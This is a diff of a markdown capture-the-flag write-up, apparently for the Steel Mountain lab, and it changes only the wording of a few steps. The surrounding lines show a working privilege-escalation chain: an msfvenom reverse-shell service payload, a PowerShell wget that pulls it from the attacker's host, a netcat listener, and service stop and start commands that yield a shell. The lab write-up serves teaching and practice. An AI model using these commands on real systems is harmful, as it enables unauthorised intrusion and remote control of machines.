@@ -391,7 +391,7 @@ Looks like this is indeed an interactive service which our user has read, write 
 
 <br />
 
-Follow the instructions in Task 3 to create a payload using `msfvenom`.
+Create a payload using `msfvenom` as instructed in Task 3.
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
@@ -399,7 +399,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -e x86/shi
 
 <br />
 
-Follow the instructions on the task to stop the service on the target machine.
+Use the command provided on the task to stop the service on the target machine.
 
 ```
 C:\Program Files (x86)\IObit\Advanced SystemCare>sc stop AdvancedSystemCareService9
@@ -417,7 +417,7 @@ SERVICE_NAME: AdvancedSystemCareService9
 
 <br />
 
-Upload the reverse shell using the `powershell -c wget` command to transfer it from our `python` server which should still be running in the background.
+Upload the reverse shell via the `python` server we used to connect to this machine earlier if it is still running in the background, otherwise set up a temporary one from scratch.
 
 ```
 C:\Program Files (x86)\IObit\Advanced SystemCare>powershell -c wget "http://LOCAL_IP:80/ASCService.exe" -outfile "ASCService.exe"
@@ -440,13 +440,13 @@ SERVICE_NAME: AdvancedSystemCareService9
 
 <br />
 
-Once succesfully uploaded, make sure an active `netcat` listener is running locally listening to the port number specified on the reverse shell.
+Once succesfully uploaded make sure to set up an active `netcat` shell listening to the port number specified on the reverse shell.
 
 ```
 nc -lvnp LOCAL_PORT
 ```
 
-Now start the service to establish a connection with our target machine on the `netcat` shell.
+Now start the service to establish a connection with our target machine with `netcat`.
 
 ```
 C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemCareService9
@@ -500,5 +500,3 @@ more root.txt
 We just pwned Steel Mountain manually!
 
 <br />
-
-
